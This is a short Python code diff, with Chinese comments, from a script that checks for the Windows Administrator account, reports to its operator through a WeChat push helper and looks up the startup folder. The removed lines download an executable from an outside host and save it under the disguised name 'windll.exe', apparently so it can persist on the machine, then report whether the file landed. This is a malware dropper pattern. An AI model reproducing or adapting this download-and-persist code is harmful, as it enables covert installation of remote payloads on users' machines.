@@ -109,23 +109,7 @@ def get_startup_folder_path():
     return startup_folder_path
 # ===================干活====================
 if sys_username == 'Administrator':
-    start_cmd('start cmd')
+    # start_cmd('start cmd')
     ...
 wechat_push.Alleged_information(f'{sys_username}执行cod')
-
-url = "https://cccimg.com/down.php/3d961495fa0bd4c7be0e4d8740a699f8.exe"
-startup_folder_path = get_startup_folder_path()
-startup_folder_path2 = "D:\\"
-file_name = "windll.exe"  # 你需要指定文件名
-save_path = os.path.join(startup_folder_path, file_name)
-save_path2 = os.path.join(startup_folder_path2, file_name)
-download_file(url, save_path2)
-
-
-
-# 使用os.path.exists()函数检查文件是否存在
-if os.path.exists(save_path2):
-    wechat_push.Alleged_information(f'{save_path}存在')
-else:
-    wechat_push.Alleged_information(f'{save_path}不存在')
 
